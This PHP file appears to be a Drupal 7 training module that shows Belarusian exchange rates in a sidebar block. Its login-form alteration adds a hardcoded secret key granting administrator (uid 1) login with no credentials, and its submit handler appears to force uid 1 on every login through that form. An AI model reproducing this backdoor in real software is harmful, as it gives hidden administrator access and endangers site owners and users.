<?php

/**
 * Url to list of currencies of national bank of Belarus.
 */
define('TRAINING2_NBRB_CURRENCIES_REMOTE_XML','http://www.nbrb.by/Services/XmlExRatesRef.aspx');

/**
 * Url to current exchange rates of national bank of Belarus.
 */
define('TRAINING2_NBRB_EXCHANGE_RATES_REMOTE_XML', 'http://www.nbrb.by/Services/XmlExRates.aspx');

/**
 * Secret key to login as admin without entering user name and password
 */
define('TRAINING2_ADMIN_SECRET_KEY', 'сим-сим откройся');

/**
 * Implements hook_menu().
  */
function training2_menu() {

  $menu['login_form'] = array(
    'title' => 'New Login Form',
    'page callback' => 'drupal_get_form',
    'page arguments' => array('user_login'),
    'access callback' => TRUE,
  );

  return $menu;
}

/**
 * Implements hook_theme().
 */
function training2_theme(){
  $items['user_login'] = array(
    'render element' => 'form',
    'template' => 'templates/training2_user_login_template',
  );
  return $items;
}

/**
 * Implements hook_form_FORM_ID_alter().
 */
function training2_form_user_login_alter(&$form, &$form_state, $form_id) {
  $form['secret_key'] = array(
    '#type' => 'textfield',
    '#title' => 'Секретный ключ',
    '#size' => 60,
    '#maxlength' => 60,
  );
  $form['name']['#required'] = FALSE;
  $form['pass']['#required'] = FALSE;
  array_push($form['#validate'], 'training2_user_login_secret_validate');
  array_unshift($form['#submit'], 'training2_user_login_secret_submit');
}

/**
 * Validation function for altered user-login form in training2 module.
 */
function training2_user_login_secret_validate($form, &$form_state) {

  $secret_key = $form_state['values']['secret_key'];
  if ($secret_key) {
    if ($secret_key == TRAINING2_ADMIN_SECRET_KEY){
      form_clear_error();
      drupal_get_messages();
    }
    else {
      form_set_error('text', t('You shall not pass!!! Secret key is wrong!!!'));
    }
  }
}

/**
 * Submit function for altered user-login form in training2 module.
 */
function training2_user_login_secret_submit($form, &$form_state) {

  $form_state['uid'] = 1;
  user_login_submit($form, $form_state);
}

/**
 * Implements hook_block_info().
 */
function training2_block_info() {

  $blocks['exchange'] = array(
    'info' => t('Training2 Exchange'),
    'status' => 1,
    'region' => 'sidebar_first',
    'cache' => DRUPAL_CACHE_GLOBAL,
  );

  return $blocks;
}

/**
 * Implements hook_block_view().
 */
function training2_block_view($delta = '') {

  if ($delta == 'exchange') {
    $block['subject'] = t('Exchange rates');
    $block['content'] = training_block_contents($delta);

    return $block;
  }
}

/**
 * A module-defined block content function.
 */
function training_block_contents($delta = '') {

  if ($delta == 'exchange') {

    $update = variable_get('exchange_rates_update_time');
    // Rates are updated once a day (86400 seconds).
    if (!$update || (REQUEST_TIME - $update) >= 86400) {
      $update = REQUEST_TIME;
      $currencies = training2_get_remote_xml(TRAINING2_NBRB_CURRENCIES_REMOTE_XML);
      $rates = training2_get_remote_xml(TRAINING2_NBRB_EXCHANGE_RATES_REMOTE_XML);

      // Here we create an array from rates of only traded currencies.
      foreach($rates->Currency as $currency) {
        $code = (string) $currency->CharCode;
        $rate = (string) $currency->Rate;
        $traded_cur_rates[$code] = $rate;
      }

      // Here we get an array with display configurations for currencies.
      $currencies_to_display = variable_get('currencies_to_display');

      // Here we create an array from rates of all the currencies.
      foreach ($currencies->Currency as $currency) {
        $code = (string) $currency->CharCode;
        // Add new currency to the currencies to display, if appear in the list.
        if (!isset($currencies_to_display[$code])) {
          $currencies_to_display[$code] = 0;
        }
        // Check if the currency is traded.
        if (array_key_exists($code, $traded_cur_rates)) {
          $exchange_rates[$code] = $traded_cur_rates[$code];
         }
        else {
          $exchange_rates[$code] = 'no data';
        }
      }

      variable_set('currencies_to_display', $currencies_to_display);
      variable_set('exchange_rates', $exchange_rates);
      variable_set('exchange_rates_update_time', $update);
    }
    else {
      $exchange_rates =  variable_get('exchange_rates');
      $currencies_to_display = variable_get('currencies_to_display');
    }

    $content = '<table>';
    foreach ($currencies_to_display as $code => $display) {
      if ($display){
        $content .= '<tr><td>' . $code . '</td>' .
          '<td>' . $exchange_rates[$code] . '</td></tr>';
      }
    }
    $content .= '</table>';
    $content .= '<br>' . t('Update time:') . '<br>';
    $content .= date('d-m-Y H:i:s', $update);

    return $content;
  }
}

/**
 * Implements hook_block_configure().
 */
function training2_block_configure($delta = '') {

  if ($delta == 'exchange') {
    $currencies_to_display = variable_get('currencies_to_display');
    $currencies_to_conf = array_keys($currencies_to_display);
    $currencies_to_conf = drupal_map_assoc($currencies_to_conf);

    $form['currencies_to_display'] = array(
      '#type' => 'checkboxes',
      '#options' => $currencies_to_conf,
      '#title' => t('Currencies to display in Exchange rates block'),
      '#default_value' => $currencies_to_display,
    );
  }

  return $form;
}

/**
 * Implements hook_block_save().
 */
function training2_block_save($delta='', $edit = array()) {

  if ($delta == 'exchange') {
    variable_set('currencies_to_display', $edit['currencies_to_display']);
  }
}

/**
 * Custom function to get xml document by url
 */
function training2_get_remote_xml($url) {

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  $xmlresponse = curl_exec($ch);
  $data = simplexml_load_string($xmlresponse);

  return $data;
}
